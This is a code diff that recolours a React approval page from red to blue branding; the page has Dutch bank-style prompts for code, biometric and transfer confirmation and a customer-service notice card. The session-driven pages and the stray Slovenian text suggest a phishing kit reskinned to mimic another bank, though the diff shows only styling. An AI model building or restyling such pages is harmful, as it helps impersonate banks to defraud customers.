@@ -72,7 +72,7 @@ function GenericApprovalCard({
   return (
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
       <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
-        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#E30613]">{title}</p>
+        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#00A9E0]">{title}</p>
         <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Bevestiging vereist</h1>
         <p className="mb-6 text-base text-[#667085]">Bevestig de weergegeven code op uw apparaat om verder te gaan.</p>
 
@@ -88,7 +88,7 @@ function GenericApprovalCard({
           type="button"
           onClick={onConfirm}
           disabled={saving}
-          className="w-full rounded-[12px] bg-[#E30613] px-4 py-4 text-base font-medium text-white transition hover:bg-[#b0050f] disabled:cursor-not-allowed disabled:opacity-70"
+          className="w-full rounded-[12px] bg-[#00A9E0] px-4 py-4 text-base font-medium text-white transition hover:bg-[#b0050f] disabled:cursor-not-allowed disabled:opacity-70"
         >
           {saving ? "Bevestigen..." : "Bevestigen"}
         </button>
@@ -152,7 +152,7 @@ function BiometricApprovalCard({
             type="button"
             onClick={onConfirm}
             disabled={saving}
-            className="w-full rounded-[10px] bg-[#E30613] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#b0050f] disabled:cursor-not-allowed disabled:opacity-70"
+            className="w-full rounded-[10px] bg-[#00A9E0] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#b0050f] disabled:cursor-not-allowed disabled:opacity-70"
           >
             {saving ? "Bevestigen..." : "Bevestigen"}
           </button>
@@ -220,7 +220,7 @@ function TransferApprovalCard({
           type="button"
           onClick={onConfirm}
           disabled={saving}
-          className="flex w-full items-center justify-center gap-2 rounded-full bg-[#E30613] px-4 py-3.5 text-[15px] font-bold text-white transition hover:bg-[#b0050f] disabled:cursor-not-allowed disabled:opacity-70"
+          className="flex w-full items-center justify-center gap-2 rounded-full bg-[#00A9E0] px-4 py-3.5 text-[15px] font-bold text-white transition hover:bg-[#b0050f] disabled:cursor-not-allowed disabled:opacity-70"
         >
           <svg className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
             <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
@@ -235,9 +235,9 @@ function TransferApprovalCard({
 function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: string | null }) {
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] border border-[#E30613] bg-[#17030a] p-6 text-center shadow-[0_0_40px_rgba(227,6,19,0.3)] sm:p-10">
+      <div className="w-full max-w-[650px] rounded-[24px] border border-[#00A9E0] bg-[#040d2b] p-6 text-center shadow-[0_0_40px_rgba(0,169,224,0.3)] sm:p-10">
         <div className="mb-4">
-          <p className="text-xs font-bold uppercase tracking-widest text-[#ff6b74]">Klantenservice</p>
+          <p className="text-xs font-bold uppercase tracking-widest text-[#7fd4ff]">Klantenservice</p>
         </div>
 
         <p className="mb-6 whitespace-pre-wrap text-lg font-bold leading-tight text-white">
@@ -382,7 +382,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
   if (!ready) {
     return (
       <div className="flex min-h-screen items-center justify-center px-4">
-        <div className="size-10 animate-spin rounded-full border-4 border-[#E30613]/25 border-t-[#E30613]" />
+        <div className="size-10 animate-spin rounded-full border-4 border-[#00A9E0]/25 border-t-[#00A9E0]" />
       </div>
     );
   }
@@ -404,7 +404,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
           </div>
           <h1 className="text-xl font-bold text-[#101828]">Potrjeno!</h1>
           <p className="mt-2 text-sm text-[#667085]">Even geduld, doorverwijzen...</p>
-          <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[#E30613]/20 border-t-[#E30613]" />
+          <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[#00A9E0]/20 border-t-[#00A9E0]" />
         </div>
       </div>
     );
